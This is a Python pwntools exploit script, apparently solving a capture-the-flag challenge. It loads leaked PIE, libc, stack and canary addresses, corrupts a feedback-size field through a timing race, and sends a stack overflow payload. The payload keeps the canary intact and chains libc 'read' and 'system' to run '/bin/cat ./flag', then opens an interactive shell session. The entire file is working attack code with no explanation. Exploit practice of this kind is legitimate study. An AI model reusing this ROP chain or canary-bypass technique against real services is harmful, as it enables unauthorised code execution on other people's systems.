from pwn import *
import time

libc = ELF("./libc.so")

log.info("Wait for incoming connection...")

l = listen(7777)

_ = l.wait_for_connection()

log.info("Read current leaks...")

with open("data", "r") as f:
	data = f.readlines()

PIE = int(data[0], 16)
LIBC = int(data[1], 16)
STACK = int(data[2], 16)
CANARY = int(data[3], 16)
PIEBASE = PIE - 0x10c0

libc.address = LIBC - 0x5d817

log.info("PIE leak         : %s" % hex(PIE))
log.info("PIE base         : %s" % hex(PIEBASE))
log.info("STACK leak       : %s" % hex(STACK))
log.info("LIBC leak        : %s" % hex(LIBC))
log.info("CANARY           : %s" % hex(CANARY))
log.info("LIBC             : %s" % hex(libc.address))

log.info("Give feedback with valid size")
l.recvuntil("> ")
l.sendline("3")
l.sendlineafter("length: ", "10")
l.sendlineafter("Feedback: ", "abc")

log.info("Wait for server one to manipulate feedback size...")
time.sleep(3)

log.info("Edit feedback with corrupt feedback size...")
l.sendlineafter("y/n?: ", "y")

POPEBX = PIEBASE + 0x875
POP2 = PIEBASE + 0x00000f58
POP3 = PIEBASE + 0x00000f57

payload = "A"*52
payload += p32(CANARY)
payload += "B"*8
payload += p32(0xcafebabe)
payload += p32(libc.symbols["read"])
payload += p32(POP3)
payload += p32(5)
payload += p32(PIEBASE + 0x5500)
payload += p32(0x100)
payload += p32(libc.symbols["system"])
payload += p32(POPEBX)
payload += p32(PIEBASE + 0x5500)

l.sendlineafter("Feedback: ", payload)

log.info("Send command...")
l.sendline("/bin/cat ./flag\x00")

pause()
l.interactive()